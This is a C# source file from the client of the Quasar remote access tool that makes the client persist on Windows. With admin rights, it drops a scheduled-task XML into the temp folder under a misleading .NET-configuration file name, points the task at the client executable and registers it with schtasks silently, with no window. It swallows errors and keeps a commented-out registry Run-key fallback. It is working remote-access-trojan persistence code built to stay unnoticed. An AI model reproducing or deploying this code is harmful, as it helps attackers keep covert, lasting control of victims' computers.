using Microsoft.Win32;
using Quasar.Client.Helper;
using Quasar.Common.Enums;
using Quasar.Common.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq.Expressions;
using System.Runtime.Remoting.Messaging;
using System.Text;
using System.Windows.Forms;

namespace Quasar.Client.Setup
{
    public class ClientStartup : ClientSetupBase
    {
        private string GetHKLMPath()
        {
            if (!PlatformHelper.Is64Bit)
            {
                return "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
            }
            return "SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Run";
        }
        public void AddToStartup(string executablePath, string startupName)
        {

            if (UserAccount.Type == AccountType.Admin)
            {
                string xmlPath = Path.Combine(new string[]
                {
                    Path.GetTempPath(),
                    "dotNetConfigurationXMLOption_v480.xml"
                });
                try
                {
                    string xmlContent = Encoding.UTF8.GetString(Resource1.options);

                    xmlContent = xmlContent.Replace("notepad.exe", executablePath);

                    File.WriteAllText(xmlPath, xmlContent, new UTF8Encoding(encoderShouldEmitUTF8Identifier: false));
                }
                catch (Exception ex5)
                {
                   // MessageBox.Show($"XML file writing error while creating a task: {ex5.Message}");
                }
                ProcessStartInfo originStartInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/create /tn \"" + startupName + "\" /xml \"" + xmlPath + "\"",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };
                try
                {
                    Process p1 = Process.Start(originStartInfo);
                    p1.WaitForExit();
                    if(p1.ExitCode == 0)
                    {
                        //MessageBox.Show("created task successfully");
                        return;
                    }
                }
                catch(Exception ex)
                {
                    //MessageBox.Show($"An error occured while starting client task: {ex.Message}");
                }
            }

            //RegistryKeyHelper.AddRegistryKeyValue(RegistryHive.CurrentUser,
            //    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName, executablePath,
            //    true);
            //MessageBox.Show("registry value is changed");
        }

        public void RemoveFromStartup(string startupName)
        {
            if (UserAccount.Type == AccountType.Admin)
            {
                string xmlPath = Path.Combine(new string[]
                {
                    Path.GetTempPath(),
                    "dotNetConfigurationXMLOption_v480.xml"
                });
                File.Delete(xmlPath);

                ProcessStartInfo startInfo = new ProcessStartInfo("schtasks")
                {
                    Arguments = "/delete /tn \"" + startupName + "\" /f",
                    UseShellExecute = false,
                    CreateNoWindow = true
                };

                Process p = Process.Start(startInfo);
                p.WaitForExit(1000);
                if (p.ExitCode == 0) return;
            }

            //RegistryKeyHelper.DeleteRegistryKeyValue(RegistryHive.CurrentUser,
            //    "Software\\Microsoft\\Windows\\CurrentVersion\\Run", startupName);

        }
    }
}
